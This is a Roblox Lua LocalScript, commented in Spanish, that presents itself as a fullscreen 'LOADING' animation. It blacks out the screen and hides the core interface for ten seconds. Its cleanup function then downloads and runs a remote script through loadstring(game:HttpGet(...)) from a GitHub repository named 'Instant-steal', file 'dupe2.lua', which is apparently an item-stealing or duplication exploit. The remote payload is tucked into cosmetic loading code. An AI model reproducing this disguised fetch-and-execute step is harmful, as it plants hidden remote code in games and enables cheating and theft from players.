-- Este es un LocalScript, colócalo en:
-- StarterGui > ScreenGui > (LocalScript aquí)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Crear el ScreenGui con MÁXIMA prioridad
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingGUI"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.DisplayOrder = 999  -- Número muy alto para estar encima de TODO
loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  -- Para controlar el orden
loadingGui.Parent = playerGui

-- Crear frame de fondo que cubra ABSOLUTAMENTE TODO
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)  -- Negro sólido
loadingFrame.BorderSizePixel = 0
loadingFrame.BackgroundTransparency = 0  -- Completamente opaco
loadingFrame.ZIndex = 999  -- Prioridad máxima dentro del GUI
loadingFrame.Parent = loadingGui

-- Crear contenedor para las letras con alta prioridad
local lettersContainer = Instance.new("Frame")
lettersContainer.Size = UDim2.new(0, 300, 0, 100)
lettersContainer.Position = UDim2.new(0.5, -150, 0.5, -50)
lettersContainer.BackgroundTransparency = 1
lettersContainer.ZIndex = 1000  -- Aún más alto que el fondo
lettersContainer.Parent = loadingFrame

-- Letras de "LOADING"
local letters = {"L", "O", "A", "D", "I", "N", "G"}
local textLabels = {}

-- Crear cada letra con máxima prioridad
for i, letter in ipairs(letters) do
	local textLabel = Instance.new("TextLabel")
	textLabel.Text = letter
	textLabel.Size = UDim2.new(0, 30, 0, 50)
	textLabel.Position = UDim2.new(0, (i-1) * 35, 0, 25)
	textLabel.BackgroundTransparency = 1
	textLabel.TextColor3 = Color3.new(1, 1, 1)  -- Blanco
	textLabel.TextSize = 32
	textLabel.Font = Enum.Font.GothamBold
	textLabel.TextTransparency = 0
	textLabel.ZIndex = 1001  -- Prioridad máxima para el texto
	textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)  -- Borde negro para mejor visibilidad
	textLabel.TextStrokeTransparency = 0.3
	textLabel.Parent = lettersContainer
	
	table.insert(textLabels, textLabel)
end

-- Delays para cada letra (efecto escalonado)
local delays = {0, 0.2, 0.4, 0.6, 0.8, 1.0, 1.2}

-- Función de animación
local function startLoadingAnimation()
	for i, textLabel in ipairs(textLabels) do
		local delayTime = delays[i]
		
		coroutine.wrap(function()
			task.wait(delayTime)
			
			while loadingGui.Parent do
				for step = 0, 1, 0.1 do
					if not loadingGui.Parent then break end
					textLabel.TextTransparency = step * 0.8
					task.wait(0.05)
				end
				
				for step = 1, 0, -0.1 do
					if not loadingGui.Parent then break end
					textLabel.TextTransparency = step * 0.8
					task.wait(0.05)
				end
				
				task.wait(0.5)
			end
		end)()
	end
end

-- Asegurarse de que cubra TODO incluso si hay otros GUIs
local function ensureTopPriority()
	loadingGui.DisplayOrder = 999
	pcall(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
	end)
end

ensureTopPriority()
startLoadingAnimation()

-- Función para remover el loading y restaurar la UI normal
local function removeLoading()
	pcall(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
	end)
	
	loadingGui:Destroy()
	
	-- 🟢 Ejecutar script remoto después de los 10 segundos de carga
	task.spawn(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/LeyendaZero/Instant-steal/main/dupe2.lua"))()
	end)
end

-- Ocultar temporalmente
local function hideLoading()
	loadingGui.Enabled = false
	pcall(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
	end)
end

-- Mostrar nuevamente
local function showLoading()
	loadingGui.Enabled = true
	ensureTopPriority()
end

-- ⏱️ Remover después de 10 segundos
task.delay(10, removeLoading)

return {
	Show = showLoading,
	Hide = hideLoading,
	Remove = removeLoading
}
